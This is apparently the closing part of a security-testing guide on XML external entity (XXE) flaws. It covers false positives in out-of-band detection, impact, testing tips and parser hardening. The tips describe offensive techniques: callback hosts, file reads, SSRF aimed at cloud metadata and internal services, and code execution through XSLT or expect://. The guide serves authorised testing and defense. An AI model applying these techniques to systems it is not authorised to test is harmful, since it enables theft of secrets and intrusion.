- **DNS callback without HTTP fetch** — some XML parsers resolve URIs (call `getaddrinfo` on the hostname) as part of URI validation, well before deciding whether to fetch. A DNS-only OAST hit does not prove file fetch or entity resolution. Distinguish with an HTTP-only OAST endpoint (`http://<id>.oast.fun/x`).
- **`file://` returns empty because of URI-scheme whitelist** — the parser accepts the DOCTYPE and expands the entity, but a URI-scheme allowlist rejects `file://`. General XXE is present; file-read specifically is not. Route the finding shape correctly.
- **Response length changes but no bytes leak** — the response is a different length between traversal and control probes because the app renders an error template of different length. Length-diff alone is not disclosure — compare content, not length.
- **OAST hit from a background scanner** — an antivirus / security scanner in the target's network may fetch OAST URLs to sandbox them before letting the app fetch. An HTTP hit from a scanner IP is not confirmation of app-side fetch; distinguish by User-Agent, source IP against a known scanner range, and timing (scanner is typically <100ms; app-side XML parser is variable).
- **XSD schema-fetch is not XXE per se** — the parser fetching an `xsi:schemaLocation` URL is legitimate XSD behavior, not XXE. The XXE-shape is what the fetched schema does; if the schema itself contains a DOCTYPE that gets processed by the schema parser, that's a chained exposure but not a direct XXE.

## Impact

- Disclosure of credentials/keys/configs, code, and environment secrets
- Access to cloud metadata/token services and internal admin panels
- Denial of service via entity expansion or slow external resources
- Code execution via XSLT/expect:// in insecure stacks

## Pro Tips

1. Prefer OAST first; it is the quietest confirmation in production-like paths
2. When content is sanitized, use error-based and length/ETag diffs
3. Probe XInclude/XSLT; they often remain enabled after entity resolution is disabled
4. Aim SSRF at internal well-known ports (kubelet, Docker, Redis, metadata) before public hosts
5. In uploads, repackage OOXML/SVG rather than standalone XML; many apps parse these implicitly
6. Keep payloads minimal; avoid noisy billion-laughs unless specifically testing DoS
7. Test background processors separately; they often use different parser settings
8. Validate parser options in code/config; do not rely on WAFs to block DOCTYPE
9. Combine with path traversal and deserialization where XML touches downstream systems
10. Document exact parser behavior per stack; defenses must match real libraries and flags

## Summary

XXE is eliminated by hardening parsers: forbid DOCTYPE, disable external entity resolution, and disable network access for XML processors and transformers across every code path.
